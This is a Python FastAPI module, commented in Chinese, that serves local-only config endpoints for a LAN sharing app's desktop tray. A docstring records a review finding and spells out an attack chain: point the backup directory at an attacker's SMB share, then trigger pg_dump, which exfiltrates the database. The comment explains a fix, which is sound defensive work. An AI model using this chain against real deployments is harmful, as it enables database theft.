"""本机专用的配置端点：给桌面托盘 / 控制面板用。

存在的理由和 /local/qr 一样：桌面端没有登录态，调不动 /admin/* 那套接口，
但它确实需要读写几个「服务层」的配置（不是用户数据，是这台机器怎么对外）。

所有端点都只允许本机访问，判定逻辑用 security.effective_client_ip ——
那套逻辑处理了「经 Caddy 反代后 client.host 全是 127.0.0.1」这个陷阱。

内容范围刻意收得很窄：只有公网入口地址。别的东西（账号、权限、文件）
一律不放这里，那些必须走正常的认证通道。
"""

from __future__ import annotations

from urllib.parse import urlsplit

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from app import settings
from app.security import effective_client_ip, is_public_entry

router = APIRouter()

_LOOPBACKS = ("127.0.0.1", "::1", "localhost")


def _require_local(request: Request) -> None:
    """非本机一律 403。

    🔴 只看 IP 是不够的，这是 2026-11-04 审查抓到的 P0。

    FRP 隧道的物理链路是「公网 → frps → frpc(本机) → Caddy → 127.0.0.1:8766」。
    Caddy 看到的 remote_host 就是 127.0.0.1，注入的 X-Real-IP 也是
    127.0.0.1 —— 于是**公网陌生人发来的请求和桌面托盘发来的请求，
    在 IP 这个维度上完全一样**。只判 IP 等于把这组免登录端点对整个公网开放：

      · POST /local/backup/dir  {"dir": "\\\\attacker\\share"}   ← 改备份目录
      · POST /local/backup/run                                    ← 触发 pg_dump
        两步合起来 = 整个数据库（口令哈希、会话哈希、全部元数据）被写到
        攻击者的 SMB 共享上。
      · POST /local/public-url   ← 清空/篡改公网入口配置
      · GET  /local/backup       ← 泄露磁盘绝对路径与备份清单

    项目自己在 security.py 里早就写明了「FRP 使 client_ip 全为 127.0.0.1、
    不能按 IP 区分内外」，而 is_public_entry() 就是照这条结论做的可信判据：
    Caddy 在隧道端口注入 X-LanShare-Entry: public，客户端伪造不了。
    这里之前没有用它，属于同一个结论只落了一半。
    """
    if is_public_entry(request):
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")
    ip = effective_client_ip(request)
    if ip not in _LOOPBACKS:
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")


class PublicUrlBody(BaseModel):
    # 备用入口已删除（2026-11-04 用户要求）。旧版托盘仍会多传一个 url_alt
    # 字段，Pydantic 默认忽略未知字段，所以旧客户端不会因此报错。
    url: str = ""


def _normalize(raw: str) -> tuple[str, str]:
    """把用户输入整理成规范形式，返回 (存库值, 错误说明)。

    用户可能输入：
        xxx.frp-any.com:35391       → 补 https://
        https://xxx.frp-any.com:35391/
        http://192.168.1.100:8765    → 允许，但要提醒这不是公网地址

    空字符串表示「清除配置」，合法。
    """
    text = (raw or "").strip()
    if not text:
        return "", ""

    if not text.startswith(("http://", "https://")):
        # 没写协议：默认 https。公网入口几乎都是 HTTPS，
        # 而 sakuraFrp 的「自动 HTTPS」也是这个假设。
        text = "https://" + text

    parts = urlsplit(text)
    if not parts.netloc:
        return "", f"地址里没有主机名：{raw}"

    # 去掉尾部斜杠，存库统一形态（前端拼路径时不会出现双斜杠）
    normalized = f"{parts.scheme}://{parts.netloc}"
    return normalized, ""


@router.get("/local/public-url")
async def get_public_url(request: Request):
    """读当前配置的公网入口地址。

    返回的 url 是存库值；available 表示服务器实际能不能读库
    （比如数据库还没初始化时 get_setting 会抛异常）。
    """
    _require_local(request)
    try:
        primary = settings.get_setting(settings.PUBLIC_BASE_URL)
    # 读不到要说出来，不能装作空配置（项目已 ignore BLE001，无需 noqa）
    except Exception as exc:
        return {"url": "", "available": False, "error": f"读取配置失败：{exc}"}
    return {"url": primary or "", "available": True, "error": ""}


@router.post("/local/public-url")
async def set_public_url(request: Request, body: PublicUrlBody):
    """保存公网入口地址。

    保存后立即清掉 security 的 netloc 缓存，否则要等 60 秒才生效 ——
    用户填完点「验证」会以为没保存成功。
    """
    _require_local(request)

    primary, err = _normalize(body.url)
    if err:
        raise HTTPException(status_code=422, detail=err)

    try:
        settings.set_setting(settings.PUBLIC_BASE_URL, primary)
        # 顺手清掉历史备用地址：这个字段已经没有读取方，留着只会在
        # App 的入口清单里冒出一个连不上的旧地址（2026-11-04 实机见过
        # 一个指向另一条隧道端口的僵尸值）。
        settings.set_setting(settings.PUBLIC_BASE_URL_ALT, "")
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"保存失败：{exc}") from exc

    # 改完立即生效（不然防爆破的公网/LAN 分账要等 60 秒才切过来）
    try:
        from app.security import reset_netloc_cache

        reset_netloc_cache()
    # 缓存清不掉不影响保存结果
    except Exception:
        pass

    # T3（2026-11-05）：同理清掉 /api/app/entries 的 60 秒缓存 —— 托盘改完
    # 地址，App 端最长 60 秒还在拿旧值。备用入口已删，这是唯一写入口，
    # 漏清的「改了没生效」每次改地址都会发生。
    try:
        from app.api.appver import reset_entries_cache

        reset_entries_cache()
    except Exception:
        pass

    return {"ok": True, "url": primary}


# ───────────────────────── 反馈上报配置（v4.0.9 P2） ─────────────────────────
# 和更新源同一套心智模型：本机可以填一个「自己维护的接收端」，没填就走公开通道。
# 区别在于反馈是**推**不是拉：推失败等于数据丢失，所以这里只管「往哪推」，
# 落盘永远在本地先做完。
#
# 逻辑写成两个纯函数（read/apply），因为 /local 与 /api/admin 两条通道都要用：
# 托盘没有登录态走 /local，网页设置页走 admin。两处各写一遍必然漂移。

_SECRET_KEYS = (
    settings.FEEDBACK_RELAY_TOKEN,
    settings.FEEDBACK_GH_TOKEN,
    settings.FEEDBACK_INBOX_TOKEN,
)


def _mask(v: str) -> str:
    """token 只回「设了没 / 多少位」，绝不回明文 —— 这个页面可能被投屏或截图。"""
    v = (v or "").strip()
    return f"已设置（{len(v)} 位）" if v else ""


class FeedbackConfigBody(BaseModel):
    enabled: bool | None = None          # 自定义地址上报开关
    url: str | None = None               # 接收端地址
    token: str | None = None             # 发送方 Bearer（写入用，不回显）
    source: str | None = None            # 本机标识
    gh_enabled: bool | None = None       # 本机直连 GitHub（开发端自用）
    gh_repo: str | None = None
    gh_token: str | None = None
    inbox_token: str | None = None       # 本机作为接收端时用


def read_feedback_config() -> dict:
    try:
        g = settings.get_setting
        return {
            "enabled": (g(settings.FEEDBACK_RELAY_ENABLED, "") or "").strip() == "1",
            "url": g(settings.FEEDBACK_RELAY_URL, "") or "",
            "token": _mask(g(settings.FEEDBACK_RELAY_TOKEN, "")),
            "source": g(settings.FEEDBACK_SOURCE, "") or "lanshare",
            "gh_enabled": (g(settings.FEEDBACK_GH_ENABLED, "") or "").strip() == "1",
            "gh_repo": g(settings.FEEDBACK_GH_REPO, "") or "",
            "gh_token": _mask(g(settings.FEEDBACK_GH_TOKEN, "")),
            "inbox_token": _mask(g(settings.FEEDBACK_INBOX_TOKEN, "")),
            "available": True,
            "error": "",
        }
    except Exception as exc:
        return {"available": False, "error": f"读取配置失败：{exc}"}


def apply_feedback_config(body: FeedbackConfigBody) -> None:
    """校验并逐项落库。

    逐项而不是整份覆盖：地址和 token 是两个输入框，用户可能只改一个。
    整份覆盖会让「只改地址」把 token 清空 —— 而且界面上看不出来
    （token 框显示的是脱敏文案），下次上报静默失败。
    """
    url = (body.url or "").strip()
    if url and not url.lower().startswith(("http://", "https://")):
        raise HTTPException(status_code=422, detail="上报地址必须是 http:// 或 https:// 开头")
    if url.lower().startswith("http://") and "127.0.0.1" not in url and "localhost" not in url:
        raise HTTPException(
            status_code=422,
            detail="明文 http 只允许本机。对外接收端必须用 https —— token 会跟着请求发出去",
        )
    repo = (body.gh_repo or "").strip()
    if repo and "/" not in repo:
        raise HTTPException(status_code=422, detail="仓库写成 owner/repo")

    if body.enabled is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_ENABLED, "1" if body.enabled else "")
    if body.url is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_URL, url)
    if body.token is not None:
        settings.set_setting(settings.FEEDBACK_RELAY_TOKEN, body.token.strip())
    if body.source is not None:
        raw = body.source.strip()
        src = "".join(
            ch for ch in raw if ch.isalnum() or ch in "_-" or "\u4e00" <= ch <= "\u9fff"
        )
        settings.set_setting(settings.FEEDBACK_SOURCE, src[:40] or "lanshare")
    if body.gh_enabled is not None:
        settings.set_setting(settings.FEEDBACK_GH_ENABLED, "1" if body.gh_enabled else "")
    if body.gh_repo is not None:
        settings.set_setting(settings.FEEDBACK_GH_REPO, repo)
    if body.gh_token is not None:
        settings.set_setting(settings.FEEDBACK_GH_TOKEN, body.gh_token.strip())
    if body.inbox_token is not None:
        settings.set_setting(settings.FEEDBACK_INBOX_TOKEN, body.inbox_token.strip())


@router.get("/local/feedback-config")
async def get_feedback_config(request: Request):
    _require_local(request)
    return read_feedback_config()


@router.post("/local/feedback-config")
async def set_feedback_config(request: Request, body: FeedbackConfigBody):
    _require_local(request)
    try:
        apply_feedback_config(body)
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"保存失败：{exc}") from exc
    return {"ok": True}
